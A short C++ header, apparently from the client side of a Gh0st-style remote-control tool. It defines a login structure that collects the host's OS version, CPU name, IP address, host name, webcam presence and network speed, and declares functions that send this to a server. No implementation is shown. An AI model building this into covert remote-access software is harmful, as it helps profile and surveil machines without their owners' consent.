#pragma once
#include<windows.h>
#include<iostream>
#include<tchar.h>
#include"IocpClient.h"
#include <Vfw.h>
#include"Login.h"
#include"Common.h"
#pragma comment(lib,"Vfw32.lib")
#pragma pack(1)   //注意结构体体粒度对齐
typedef struct  _LOGIN_INFORMAITON_
{
	BYTE			IsToken;		    //信息头部
	OSVERSIONINFOEX	OsVersionInfoEx;	//版本信息
	char ProcessorName[MAX_PATH];	    //CPU主频
	IN_ADDR			ClientAddress;		//存储32位的IPv4的地址数据结构
	char			HostName[MAX_PATH];	//主机名
	BOOL			IsWebCameraExist;		//是否有摄像头
	DWORD			WebSpeed;		    //网速
}LOGIN_INFORMAITON, * PLOGIN_INFORMAITON;


int SendLoginInformation(CIocpClient* IOCPClient, DWORD WebSpeed);
LONG GetProcessorName(char* ProcessorName, ULONG* ProcessorNameLength);
BOOL IsWebCamera();